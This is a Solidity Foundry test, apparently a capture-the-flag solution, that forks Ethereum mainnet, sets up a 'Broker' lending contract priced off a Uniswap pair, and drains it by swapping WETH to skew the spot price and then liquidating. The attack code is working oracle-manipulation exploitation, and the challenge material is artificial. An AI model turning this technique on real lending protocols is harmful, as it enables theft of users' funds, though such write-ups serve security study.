pragma solidity 0.8.0;

import "../src/broker/Broker.sol";
import "forge-std/Test.sol";

contract Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public dropped;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 1_000_000 ether;
    uint256 public AMT = totalSupply / 100_000;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    function approve(address to, uint256 amount) public returns (bool) {
        allowance[msg.sender][to] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        return transferFrom(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        if (from != msg.sender) {
            allowance[from][to] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function airdrop() public {
        require(!dropped[msg.sender], "err: only once");
        dropped[msg.sender] = true;
        balanceOf[msg.sender] += AMT;
        totalSupply += AMT;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract Exploit is Test {
    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Factory public constant factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    Token public token;
    IUniswapV2Pair public pair;
    Broker public broker;

    uint256 constant DECIMALS = 1 ether;
    uint256 totalBefore;
    address player = address(0xBaDa55);

    IUniswapV2Router public constant router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth");
        weth.deposit{value: 50 ether}();

        token = new Token();
        pair = IUniswapV2Pair(factory.createPair(address(weth), address(token)));
        broker = new Broker(pair, ERC20Like(address(token)));
        token.transfer(address(broker), 500_000 * DECIMALS);

        // 1:25
        weth.transfer(address(pair), 25 ether);
        token.transfer(address(pair), 500_000 * DECIMALS);
        pair.mint(address(this));

        weth.approve(address(broker), type(uint256).max);
        broker.deposit(25 ether);
        broker.borrow(250_000 * DECIMALS);

        totalBefore = weth.balanceOf(address(broker)) + token.balanceOf(address(broker)) / broker.rate();
        vm.deal(player, 15 ether);
    }

    function isSolved() public view returns (bool) {
        return weth.balanceOf(address(broker)) < 5 ether;
    }

    function testBrokerExploit() public {
        uint256 amount = 15 ether;

        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(token);

        vm.startPrank(player);

        weth.deposit{value: amount}();
        weth.approve(address(router), amount);
        uint256[] memory amts = router.swapExactTokensForTokens(
            amount,
            0,
            path,
            player,
            block.timestamp
        );

        token.approve(address(broker), amts[1]);
        broker.liquidate(address(this), amts[1]);
        require(isSolved(), "NOT SOLVED");
    }
}


